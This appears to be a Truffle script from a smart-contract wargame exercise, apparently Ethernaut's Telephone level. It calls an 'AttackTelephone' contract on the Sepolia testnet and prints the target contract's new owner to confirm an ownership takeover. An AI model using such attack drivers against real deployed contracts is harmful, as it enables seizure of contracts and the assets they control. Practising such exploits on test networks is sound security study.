const AttackTelephone = artifacts.require("AttackTelephone");
const Telephone = artifacts.require("Telephone");

module.exports = async function (callback) {
  try {
    // Replace this with the Sepolia-deployed Telephone contract address
    const telephoneAddress = "0x63d89DB91a95940adE99E2B65D16022BE5A22C6b";
    const accounts = await web3.eth.getAccounts();
    const attacker = accounts[0]; // Assuming the first account is the attacker

    // Get the deployed instance of the AttackTelephone contract
    const attackInstance = await AttackTelephone.deployed();
    console.log(
      `Attack contract deployed at address: ${attackInstance.address}`
    );

    // Call the attack function
    const tx = await attackInstance.attack({ from: attacker });
    console.log(`Attack transaction sent: ${tx.tx}`);

    // Check the ownership status
    const telephoneContract = new web3.eth.Contract(
      Telephone.abi,
      telephoneAddress
    );
    const owner = await telephoneContract.methods.owner().call();
    console.log(`New owner of the Telephone contract: ${owner}`);

    callback();
  } catch (error) {
    console.error(error);
    callback(error);
  }
};
